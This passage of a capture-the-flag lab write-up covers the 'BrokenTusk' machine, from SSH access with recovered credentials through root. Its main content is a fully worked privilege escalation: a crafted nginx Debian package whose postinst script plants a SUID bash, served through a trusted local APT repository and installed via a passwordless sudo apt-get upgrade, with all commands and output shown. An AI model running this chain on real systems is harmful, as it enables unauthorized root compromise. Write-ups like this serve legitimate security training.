### 5.2 Running passgoblin

I ran the executable and supplied the decoded string as the key.

```bash
cd /opt
./passgoblin
```

After providing the key, the program revealed the following credentials:

```text
Username: zer0arc4
Password: TooBigToHide123!
```

This gave me credentials for the user account discovered earlier in `/etc/passwd`.

---

## 6. Obtaining SSH Access as zer0arc4

With the credentials discovered from `passgoblin`, I attempted to log in through SSH.

```bash
ssh zer0arc4@192.168.108.130
```

After confirming the host authenticity prompt and entering the password, I successfully logged in.

I checked the current user:

```bash
whoami
id
```

The account was:

```text
zer0arc4
uid=1000(zer0arc4) gid=1000(zer0arc4) groups=1000(zer0arc4),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev),103(bluetooth)

```

I then inspected the home directory:

```bash
ls -la
```

The directory contained a file named `user.txt`.

### 6.1 Retrieving the User Flag

```bash
cat user.txt
```

**Output:**

```text
9346e4474996a9ba8cc5248f4e5051c5
```

<badge color="success">User flag obtained</badge>

I now had a normal SSH session as `zer0arc4`. The next objective was to escalate privileges to root.

---

## 7. Privilege Escalation – Abusing APT Configuration

### 7.1 Checking Sudo Permissions as zer0arc4

I checked the commands that the user could execute with sudo.

```bash
sudo -l
```

**Output:**

```text
Matching Defaults entries for zer0arc4 on BrokenTusk:
    env_reset, env_keep+="ftp_proxy http_proxy https_proxy no_proxy",
    mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User zer0arc4 may run the following commands on BrokenTusk:
    (ALL : ALL) NOPASSWD: /usr/bin/apt-get update, /usr/bin/apt-get upgrade
```

This was the important discovery.

The user could run the following commands as root without entering a password:

```text
/usr/bin/apt-get update
/usr/bin/apt-get upgrade
```

APT is the package-management tool used on Debian-based Linux systems.

Normally, package installation and upgrade operations require elevated privileges because packages can execute installation scripts during installation or upgrade.

The sudo rule therefore required further investigation.

### 7.2 Inspecting the APT Repository Configuration

I inspected the configured APT sources.

```bash
cat /etc/apt/sources.list.d/brokentusk.list
```

**Output:**

```text
deb [trusted=yes] http://package.brokentusk.nyx/debian/ trixie main
```

The target was configured to use a repository at:

```text
http://package.brokentusk.nyx/debian/
```

The `[trusted=yes]` option was particularly important because it tells APT to treat packages from this repository as trusted without requiring normal repository authentication.

I also inspected the hostname resolution:

```bash
cat /etc/hosts
```

The relevant entry was:

```text
127.0.0.1 package.brokentusk.nyx
```

This showed that `package.brokentusk.nyx` resolved to the target's loopback address.

### 7.3 Identifying the Local Repository Server

I investigated the local process listening on port 8080.

The environment contained the following proxy configuration:

```text
http_proxy=http://127.0.0.1:8080
```

I inspected the process information:

```bash
readlink -f /proc/1286/cwd
```

**Output:**

```text
/tmp/repo
```

Then I checked its command line:

```bash
tr '\0' ' ' < /proc/1286/cmdline
```

**Output:**

```text
python3 -m http.server 8080
```

This showed that a Python HTTP server was running with `/tmp/repo` as its working directory.

The repository requests were being served from this local directory.

The important observation was that the APT configuration, hostname resolution, proxy environment, and local repository server were all connected.

### 7.4 Understanding the Privilege-Escalation Opportunity

The sudo configuration allowed `zer0arc4` to run APT upgrades as root.

The configured package repository was trusted, and the local repository content could be modified in the lab environment.

A Debian package can contain installation scripts, including a `postinst` script. A package's `postinst` script is executed by the package-management system during package configuration.

Because the upgrade operation was executed with root privileges, a package installation script could also execute with root privileges.

I decided to test this behavior using the already-installed `nginx` package.

### 7.5 Creating the Initial Test Package

The installed package was identified as `nginx` version `99.0`.

I prepared a package with a higher version number so that APT would recognize it as an available upgrade.

The initial package's `postinst` script was:

```bash
#!/bin/sh
cp /bin/bash /tmp/rootbash
chmod 4755 /tmp/rootbash
```

The purpose was to copy Bash into `/tmp` and set the SUID permission bit.

I then ran the permitted APT upgrade command:

```bash
sudo /usr/bin/apt-get upgrade
```

After the package operation, I checked the resulting file:

```bash
ls -l /tmp/rootbash
```

**Output:**

```text
-rwsr-xr-x 1 root root 1298416 Nov 9 01:32 /tmp/rootbash
```

The file was owned by root and had the SUID bit set.

However, executing it did not provide the expected elevated shell.

### 7.6 Understanding Why the First Attempt Failed

I investigated the mount options for `/tmp`.

```bash
findmnt -no TARGET,OPTIONS /tmp
```

**Output:**

```text
/tmp rw,nosuid,nodev,size=1010616k,...
```

The important option was:

```text
nosuid
```

The `nosuid` mount option prevents the kernel from honoring SUID and SGID permission bits on that filesystem.

Therefore, although `/tmp/rootbash` had the SUID bit set, the kernel did not use it to grant effective root privileges.

I checked the mount information for `/var/tmp`:

```bash
findmnt -no TARGET,OPTIONS /var/tmp
```

The output showed that `/var/tmp` was part of the root filesystem and did not have the `nosuid` option.

This provided a suitable alternative location for the test.

### 7.7 Rebuilding the Package to Use /var/tmp

I updated the package version from `99.0` to `99.1` so APT would recognize it as a newer version.

On the machine where I was building the local repository package, I modified the package control file:

```bash
sed -i 's/^Version: 99.0$/Version: 99.1/' /tmp/nginx-build/DEBIAN/control
```

Next, I replaced the package's `postinst` script:

```bash
cat > /tmp/nginx-build/DEBIAN/postinst <<'EOF'
#!/bin/sh
cp /bin/bash /var/tmp/rootbash
chmod 4755 /var/tmp/rootbash
EOF
```

I made the script executable:

```bash
chmod 755 /tmp/nginx-build/DEBIAN/postinst
```

Then I rebuilt the Debian package:

```bash
dpkg-deb --build /tmp/nginx-build /tmp/repo/debian/dists/trixie/main/binary-amd64/nginx_99.1_amd64.deb
```

The updated package now contained a `postinst` script that copied Bash to `/var/tmp/rootbash` and set the SUID permission bit.

### 7.8 Rebuilding the APT Package Index

After rebuilding the package, I needed to update the repository's package index so APT could discover version `99.1`.

I navigated to the repository's distribution directory:

```bash
cd /tmp/repo/debian/dists/trixie
```

I defined the package index paths:

```bash
P=main/binary-amd64/Packages
G=main/binary-amd64/Packages.gz
DEB=main/binary-amd64/nginx_99.1_amd64.deb
```

Then I generated the package metadata:

```bash
{
    echo "Package: nginx"
    echo "Version: 99.1"
    echo "Architecture: amd64"
    echo "Maintainer: lab"
    echo "Filename: dists/trixie/$DEB"
    echo "Size: $(stat -c%s "$DEB")"
    echo "MD5sum: $(md5sum "$DEB" | cut -d' ' -f1)"
    echo "SHA1: $(sha1sum "$DEB" | cut -d' ' -f1)"
    echo "SHA256: $(sha256sum "$DEB" | cut -d' ' -f1)"
    echo "Section: web"
    echo "Priority: optional"
    echo "Description: BrokenTusk privilege escalation lab package"
    echo
} > "$P"
```

I compressed the package index:

```bash
gzip -kf "$P"
```

This generated the compressed `Packages.gz` index used by the repository.

### 7.9 Updating the Repository Release File

I also rebuilt the repository's `Release` file so that it contained the current checksums and file sizes.

```bash
{
    echo "Origin: Debian"
    echo "Label: BrokenTusk Repo"
    echo "Suite: trixie"
    echo "Date: $(date -Ru)"
    echo "Architectures: amd64"
    echo "Components: main"
    echo "SHA256:"
    for f in "$P" "$G"; do
        printf " %s %s %s\n" \
            "$(sha256sum "$f" | awk '{print $1}')" \
            "$(stat -c%s "$f")" \
            "$f"
    done
} > Release
```

The local repository now contained the updated package and metadata for version `99.1`.

### 7.10 Refreshing the APT Package Information

Back on the target machine, I refreshed the package lists using the permitted sudo command.

```bash
sudo /usr/bin/apt-get update
```

**Relevant output:**

```text
Get:7 http://package.brokentusk.nyx/debian trixie Release [333 B]
Get:9 http://package.brokentusk.nyx/debian trixie/main amd64 Packages [314 B]
```

Some external HTTPS repository requests returned HTTP 501 CONNECT errors. However, the local BrokenTusk repository was successfully accessed.

I checked which `nginx` version APT would install:

```bash
apt-cache policy nginx
```

**Output:**

```text
nginx:
  Installed: 99.0
  Candidate: 99.1
  Version table:
     99.1 500
        500 http://package.brokentusk.nyx/debian trixie/main amd64 Packages
 *** 99.0 100
        100 /var/lib/dpkg/status
```

This confirmed that:

- Installed version: `99.0`
- Candidate version: `99.1`

APT recognized version `99.1` as an available upgrade from the configured local repository.

### 7.11 Executing the APT Upgrade

I then ran the permitted upgrade command:

```bash
sudo /usr/bin/apt-get upgrade
```

**Relevant output:**

```text
Get:1 http://package.brokentusk.nyx/debian trixie/main amd64 nginx amd64 99.1 [613 kB]

Unpacking nginx (99.1) over (99.0) ...

Setting up nginx (99.1) ...

Processing triggers for man-db ...
```

During package configuration, the `postinst` script executed with the privileges of the package-management process.

The script copied `/bin/bash` to `/var/tmp/rootbash` and set its SUID permission bit.

I checked the resulting file:

```bash
ls -l /var/tmp/rootbash
```

**Output:**

```text
-rwsr-xr-x 1 root root 1298416 Nov 9 01:41 /var/tmp/rootbash
```

The file was owned by root, and the SUID permission bit was set.

Unlike `/tmp`, the `/var/tmp` filesystem did not have the `nosuid` mount option.

### 7.12 Obtaining Root Access

I executed the SUID Bash binary with the `-p` option.

```bash
/var/tmp/rootbash -p
```

**Output:**

```text
rootbash-5.2#
```

I verified the privileges:

```bash
id
```

**Output:**

```text
uid=1000(zer0arc4) gid=1000(zer0arc4) euid=0(root) groups=...
```

Then I checked the current effective user:

```bash
whoami
```

**Output:**

```text
root
```

<badge color="success">Root access obtained.</badge>

The `id` output showed that the real UID remained `1000`, while the effective UID was `0`. This confirmed that the SUID Bash binary was executing with root privileges.

The `-p` option preserved the effective privileges instead of dropping them.

**Root privilege escalation was successful.**

Lets find Root flag:

```bash
cat /root/root.txt
```

**Output:**
```text
65742587f1d6944b0ed55f6c1d311e21

```
Successfully obtained the root flag and completed the "BrokenTusk" machine.


## 7.13 Retrieving the Flags


Both flags were successfully retrieved during the lab.

| Flag | File | Result |
|---|---|---|
| User flag | `/home/user.txt` | `9346e4474996a9ba8cc5248f4e5051c5` |
| Root flag | `/root/root.txt` | `65742587f1d6944b0ed55f6c1d311e21` |






---

## 8. Attack Path Summary

The complete attack path was:

1. Discovered the target IP address using `arp-scan`.
2. Scanned the target with Nmap and identified SSH (22) and HTTP (80).
3. Enumerated the web server using FFUF and Gobuster.
4. Discovered `/api/`, `/app/`, `/app/upload.php`, and `/vuln.php`.
5. Identified the `page` parameter in `vuln.php` as vulnerable to Local File Inclusion.
6. Used LFI to read `/etc/hostname` and `/etc/passwd`.
7. Discovered the username `zer0arc4`.
8. Retrieved the vulnerable PHP source code using `php://filter`.
9. Confirmed that PHP-FPM was running as `www-data` (UID 33).
10. Investigated PHP session handling and tested a PHP2Shell PoC.
11. Received a reverse shell as `www-data`.
12. Enumerated SUID binaries, cron jobs, web-root files, and PHP session files.
13. Investigated `/opt/passgoblin` and extracted a key from its embedded Base64 string.
14. Obtained the credentials for `zer0arc4`.
15. Logged in through SSH and retrieved the user flag.
16. Ran `sudo -l` and discovered passwordless permission to execute `apt-get update` and `apt-get upgrade`.
17. Investigated the local APT repository and its configuration.
18. Created a higher-version `nginx` package containing a privileged `postinst` script.
19. Initially tested the SUID Bash binary in `/tmp`, but the `nosuid` mount option prevented privilege escalation.
20. Rebuilt the package to place the SUID Bash binary in `/var/tmp`.
21. Executed the permitted APT upgrade and obtained a root-effective shell using `/var/tmp/rootbash -p`.

---

## 9. Vulnerabilities and Misconfigurations Identified

| Finding | Description | Impact |
|---|---|---|
| Local File Inclusion | `vuln.php` passes the user-controlled `page` parameter directly to `include()` | Local file disclosure |
| PHP application information disclosure | PHP version and detailed error messages were exposed | Revealed useful application information |
| Insecure application design | PHP session and object-handling test files were present in the web root | Required further investigation; not established as the final root path |
| Exposed local credentials | The `passgoblin` executable revealed credentials when supplied with its embedded clue | Allowed access as `zer0arc4` |
| Overly permissive sudo rule | `zer0arc4` could run APT update and upgrade commands as root without a password | Enabled privileged package installation |
| Untrusted package repository configuration | The APT source used `[trusted=yes]` | Repository packages were not subject to normal repository authentication |
| Privileged package script execution | APT package configuration executed the package's `postinst` script with root privileges | Allowed creation of a root-owned SUID Bash binary |

---

## 10. Tools Used
| Tool | Purpose |
|---|---|
| `arp-scan` | Discovered active devices on the local network and identified the target IP address. |
| Nmap | Scanned the target for open ports, running services, and service versions. |
| FFUF | Discovered hidden directories and files on the web server. |
| Gobuster | Performed directory and file enumeration on the web application. |
| cURL | Sent HTTP requests, tested the LFI vulnerability, and accessed local files through the vulnerable parameter. |
| PHP2Shell PoC | Investigated PHP session deserialization and tested a possible route to remote command execution. |
| `strings` | Extracted readable strings from the compiled `passgoblin` binary. |
| Base64 | Decoded the hidden string extracted from the `passgoblin` binary. |
| APT | Updated the package index and upgraded the specially crafted package to trigger the privilege escalation. |
| `dpkg-deb` | Built the custom Debian package containing the privilege-escalation payload. |
| Python HTTP server | Hosted the local APT repository so the target could access the custom package. |


### 11. Lab Summary
- Discovered the BrokenTusk target machine using arp-scan and identified its IP address.
- Performed an Nmap scan and found SSH and HTTP services running on the target.
- Enumerated the web server using FFUF and Gobuster and discovered hidden directories and files.
- Identified a Local File Inclusion (LFI) vulnerability in vuln.php.
- Exploited the LFI vulnerability to read sensitive system files, identify users, and inspect PHP source code.
- Investigated PHP session deserialization and tested the PHP2Shell PoC as a possible route to remote command execution.
- Obtained a reverse shell and gained initial access to the target as www-data.
- Enumerated the system and discovered the passgoblin binary in /opt.
- Analyzed the binary using strings and extracted a hidden Base64-encoded string.
- Decoded the string and used the discovered credentials to access the machine through SSH as zer0arc4.
- Retrieved the user flag.
- Enumerated sudo permissions and discovered that zer0arc4 could execute apt-get update and apt-get upgrade as root without entering a password.
- Investigated the APT configuration and discovered a local repository that could be modified and served to the target.
- Created a custom Debian package with a postinst script that copied Bash to /var/tmp and enabled the SUID permission.
- Updated the local APT repository and upgraded the package using the permitted sudo command.
- Initially tested the payload in /tmp, but the nosuid mount option prevented SUID execution.
- Moved the payload to /var/tmp, where the SUID permission could work.
- Executed /var/tmp/rootbash -p and obtained a root shell with effective UID 0.
---
